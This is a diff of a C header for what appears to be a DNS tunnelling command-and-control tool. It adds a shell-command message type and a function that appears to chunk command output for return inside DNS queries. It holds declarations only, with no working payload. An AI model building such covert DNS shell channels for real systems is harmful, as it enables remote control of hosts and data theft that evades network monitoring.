@@ -8,8 +8,12 @@
 #ifndef DNS_PROTOCOL_H_
 #define DNS_PROTOCOL_H_
 
-// defines
-#define MESSAGE_TYPE_OFFSET 1;
+// server to client CONTROL control flow
+#define MESSAGE_TYPE_PARSE_OFFSET	 1
+#define MESSAGE_TYPE_NO_CMD 	 	 0
+#define MESSAGE_TYPE_SHELL_CMD       1
+
+//#define HOST
 
 // globals
 extern unsigned char header[];
@@ -28,6 +32,7 @@ struct CONTROL
 	unsigned char messsageLength;
 	unsigned char *message;
 };
+
 
 // create a packet buffer
 // build a struct
@@ -54,15 +59,8 @@ struct DNS_QUESTION *buildDnsQuestion(unsigned char *qNameArg,
 unsigned char *createDnsRfcQueryString(unsigned char *qnameArg,
 											unsigned int *rfcQNameLength);
 
-struct FQDN_NODE *constructFqdnList(unsigned char *_stdoutChunk,
-									unsigned char *_domain,
-										int _stdoutSize);
-
-void printList(struct FQDN_NODE *head);
-
-void push(struct FQDN_NODE *ptr_head,
-				unsigned char *_fqdn,
-					unsigned int _dataSize);
+struct NODE *constructStdoutList(unsigned char *_stdoutChunk,
+									int _stdoutSize);
 
 struct DNS_RESPONSE_PACKET *parseDnsResponse(unsigned char *_recvBuff,
 												int _recvBuffSize);
